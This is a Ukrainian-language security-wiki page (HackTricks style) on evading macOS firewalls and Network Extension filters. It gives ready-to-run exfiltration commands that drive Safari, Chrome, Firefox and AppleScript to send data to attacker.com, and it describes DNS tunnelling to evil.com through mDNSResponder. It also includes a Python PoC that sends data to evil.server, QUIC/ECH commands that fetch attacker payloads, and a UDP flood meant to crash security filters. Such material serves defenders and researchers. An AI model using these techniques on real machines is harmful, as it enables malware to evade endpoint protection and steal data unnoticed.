# Обхід брандмауерів у macOS

{{#include ../../banners/hacktricks-training.md}}

## Виявлені техніки

Наведені нижче техніки працюють у деяких firewall-додатках macOS.

### Зловживання іменами зі списку дозволених

- Наприклад, назвати malware іменами відомих процесів macOS, як-от **`launchd`**

### Synthetic Click

- Якщо firewall запитує в користувача дозвіл, змусити malware **натиснути «дозволити»**

### **Використання двійкових файлів із підписом Apple**

- Наприклад, **`curl`**, а також інші, як-от **`whois`**

### Відомі домени Apple

Firewall може дозволяти з’єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. iCloud можна використовувати як C2.

### Загальний обхід

Деякі ідеї для спроб обходу firewall

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе визначити потенційно дозволені домени або програми, яким дозволено отримувати до них доступ.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

У macOS процес **не звертається до DNS-сервера безпосередньо**. Розпізнавання імен виконується через **XPC** за посередництвом **`mDNSResponder`** (`/usr/sbin/mDNSResponder`) — системного демона, підписаного Apple, тому кожен запит на машині виходить за межі хоста як трафік **від `mDNSResponder`**, а не від процесу, якому потрібне це розпізнавання. Тому фаєрволи зазвичай безумовно довіряють цьому демону — його блокування порушило б розпізнавання імен у всій системі.<sup>[[1]](#references)</sup>

Це перетворює DNS на канал, який залишається відкритим, навіть коли фаєрвол блокує власні сокети malware:<sup>[[1]](#references)</sup>

1. Malware намагається підключитися до `evil.com`. Його **власне** вихідне з'єднання перевіряється фаєрволом і **блокується**.
2. Натомість malware просить `mDNSResponder` **розпізнати** `evil.com` через XPC.
3. Фаєрвол перевіряє отриманий запит, бачить як його ініціатора довірений резолвер, підписаний Apple, і **дозволяє його**.
4. Запит досягає DNS-сервера — і якщо атакер керує authoritative-сервером для `evil.com`, він контролює обидві сторони обміну.

Оскільки атакер володіє цією зоною, жодне «з'єднання» не потрібне: дані виносяться всередині **запитуваних labels** (наприклад, `<encoded-chunk>.evil.com`), а команди повертаються всередині **записів відповіді** (TXT, A, CNAME…), що є класичним DNS tunnelling через процес, повністю внесений до whitelist.

Будь-який непривілейований процес може безпосередньо керувати демоном — це простий спосіб підтвердити, що канал відкритий:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Через Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Ін'єкції у процеси

Якщо ви можете **впровадити код у процес**, якому дозволено підключатися до будь-якого сервера, ви можете обійти захист фаєрвола:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Останні вразливості macOS для обходу фаєрвола (2023–2025)

### Обхід фільтра вебконтенту (Screen Time) — **CVE-2024-44206**
У липні 2024 року Apple виправила критичну помилку в Safari/WebKit, яка порушувала роботу загальносистемного «фільтра вебконтенту», що використовується батьківським контролем Screen Time.
Спеціально сформований URI (наприклад, із подвійним URL-кодуванням «://») не розпізнається ACL Screen Time, але приймається WebKit, тому запит надсилається без фільтрації. Отже, будь-який процес, який може відкрити URL (зокрема sandboxed або unsigned code), може отримати доступ до доменів, явно заблокованих користувачем або профілем MDM.<sup>[[2]](#references)</sup>

Практичний тест (у системі без виправлення):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Помилка порядку правил Packet Filter (PF) у ранніх версіях macOS 14 “Sonoma”
Протягом beta-циклу macOS 14 Apple внесла регресію в userspace-обгортку навколо **`pfctl`**.
Правила, додані з ключовим словом `quick` (яке використовують багато kill-switch у VPN), мовчки ігнорувалися, спричиняючи leak трафіку, навіть коли GUI VPN/firewall повідомляв *blocked*. Помилку підтвердили кілька VPN-постачальників, і її виправили в RC 2 (build 23A344).<sup>[[6]](#references)</sup>

Швидка перевірка leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Зловживання helper-сервісами, підписаними Apple (застаріле — до macOS 11.2)
До macOS 11.2 **`ContentFilterExclusionList`** дозволяв приблизно 50 бінарним файлам Apple, зокрема **`nsurlsessiond`** і App Store, обходити всі socket-filter firewalls, реалізовані за допомогою Network Extension framework (LuLu, Little Snitch тощо).
Malware міг просто запустити виключений процес — або інжектити в нього код — і тунелювати власний трафік через уже дозволений socket. Apple повністю видалила список виключень у macOS 11.2, але ця техніка все ще актуальна для систем, які неможливо оновити.<sup>[[3]](#references)</sup>

Приклад proof-of-concept (до 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH для обходу domain filters Network Extension (macOS 12+)
NEFilter Packet/Data Providers орієнтуються на SNI/ALPN у TLS ClientHello. За використання **HTTP/3 over QUIC (UDP/443)** і **Encrypted Client Hello (ECH)** SNI залишається зашифрованим, NetExt не може розібрати flow, а правила для hostname часто працюють у режимі fail-open, дозволяючи malware підключатися до заблокованих доменів без звернення до DNS.<sup>[[5]](#references)</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Якщо QUIC/ECH усе ще ввімкнено, це простий шлях обходу фільтрації за іменем хоста.

### Нестабільність Network Extension у macOS 15 “Sequoia” (2024–2025)
Ранні збірки 15.0/15.1 спричиняють аварійне завершення роботи сторонніх фільтрів **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne тощо). Коли фільтр перезапускається, macOS видаляє його правила потоків, а багато продуктів переходять у режим fail-open. Надсилання фільтру тисяч коротких UDP-потоків (або примусове використання QUIC/ECH) може неодноразово спричинити аварійне завершення роботи та залишити вікно для C2/exfil, тоді як GUI усе ще повідомляє, що firewall працює.<sup>[[4]](#references)</sup>

Швидке відтворення (безпечний лабораторний стенд):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Поради щодо інструментів для сучасної macOS

1. Перевірте поточні правила PF, які генерують GUI firewalls:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перелічіть бінарні файли, які вже мають entitlement *outgoing-network* (корисно для piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно зареєструйте власний фільтр вмісту Network Extension в Objective-C/Swift.
Мінімальний rootless PoC, який пересилає пакети до локального socket, доступний у source code LuLu від Patrick Wardle.

## Посилання

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: створення та злам macOS firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Обхід Apple web content filter забезпечує необмежений доступ до заблокованого вмісту (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple видаляє функцію macOS, яка дозволяла застосункам обходити захист firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Продукти кібербезпеки перестають працювати після оновлення macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Використовуйте network protection, щоб допомогти запобігти підключенням macOS до небезпечних сайтів - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
- [6] [Виправлено помилку firewall у macOS 14 Sonoma! - Mullvad VPN Blog](https://mullvad.net/en/blog/2023/9/22/macos-14-sonoma-firewall-bug-fixed)

{{#include ../../banners/hacktricks-training.md}}
